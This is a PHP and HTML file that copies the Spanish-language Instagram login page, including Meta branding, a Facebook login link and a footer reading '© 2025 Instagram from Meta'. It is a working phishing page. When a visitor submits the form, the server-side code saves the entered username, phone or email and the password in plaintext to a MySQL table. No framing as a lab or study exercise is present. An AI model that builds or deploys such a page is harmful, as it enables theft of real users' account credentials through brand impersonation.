<?php
$host = 'localhost';
$dbname = 'users';
$username = 'usuario';
$password = '';

$message = '';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $conn = new mysqli($host, $username, $password, $dbname);

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $name = $_POST['name'];
    $password = $_POST['password'];

    $stmt = $conn->prepare("INSERT INTO usernames (name, password) VALUES (?, ?)");

    if ($stmt) {
        $stmt->bind_param("ss", $name, $password);

        if ($stmt->execute()) {
            $message = "<div style='color: green;'>New name created successfully!</div>";
        } else {
            $message = "<div style='color: red;'>Error: " . $stmt->error . "</div>";
        }

        $stmt->close();
    } else {
        $message = "<div style='color: red;'>Error preparing statement: " . $conn->error . "</div>";
    }

    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white dark:bg-black">
    <main class="min-h-screen flex flex-col">
        <div class="flex-grow flex justify-center items-center w-full">
            <img src="./landing-2x.png" alt="" class="mr-24 w-[500px]" >
            <div class="w-[17rem]">
                <div>
                    <img src="./white.png" alt="" class="mb-8 mx-auto hidden dark:block">
                    <img src="./black.png" alt="" class="mb-8 mx-auto dark:hidden">
                </div>
                <form action="" method="post" class="flex flex-col gap-5">
                    <input type="text" name="name" id="name"  placeholder="Teléfono, usuario o correo electrónico" class="px-2 py-[10px] rounded border text-xs border-[#dbdbdb] dark:border-[#555555] dark:bg-[#121212]">
                    <input type="password" name="password" id="password" placeholder="Contraseña" class="-mt-[14px] px-2 py-[10px] rounded border text-xs border-[#dbdbdb] dark:border-[#555555] dark:bg-[#121212]">
                    <button class="px-2 py-[6px] rounded-md bg-[#7f8dfa] dark:bg-[#3441af] text-white/60 text-sm font-semibold">Iniciar sesión</button>
                    <div class="flex items-center">
                        <div class="flex-grow border-t border-[#dbdbdb] dark:border-[#555555]"></div>
                        <span class="mx-2 text-xs font-semibold text-[#8e8e8e] dark:text-[#a3a3a3]">O</span>
                        <div class="flex-grow border-t border-[#dbdbdb] dark:border-[#555555]"></div>
                    </div>
                    <div class="flex justify-center items-center gap-2 cursor-pointer">
                        <svg class="fill-[#0095f6] inline-block size-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
                            <path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z"></path>
                        </svg>
                        <span class="text-[#0095f6] align-middle font-semibold">Iniciar sesión con Facebook</span>
                    </div>
                    <a href="#" class="text-center text-sm text-black dark:text-white">¿Olvidaste tu contraseña?</a>
                    <div class="mt-8">
                        <p class="text-center text-sm text-black dark:text-white">¿No tienes una cuenta? <a href="#" class="text-[#4150f7] dark:text-[#708dff] font-semibold">Regístrate</a></p>
                    </div>
                </form>
            </div>
        </div>
        <footer class="mb-10 flex flex-col text-[#737373] dark:text-[#a8a8a8] text-xs">
            <div class="flex justify-center space-x-6 py-6">
                <a href="#">Meta</a>
                <a href="#">Información</a>
                <a href="#">Blog</a>
                <a href="#">Empleo</a>
                <a href="#">Ayuda</a>
                <a href="#">API</a>
                <a href="#">Privacidad</a>
                <a href="#">Condiciones</a>
                <a href="#">Ubicaciones</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Meta AI</a>
                <a href="#">Artículos de Meta AI</a>
                <a href="#">Threads</a>
                <a href="#">Importación de contactos y no usuarios</a>
                <a href="#">Meta Verified</a>
            </div>
            <div class="text-center pb-6 flex justify-center gap-4">
                <div>Español</div>
                <div>© 2025 Instagram from Meta</div>
            </div>
        </footer>
    </main>
</body>
</html>
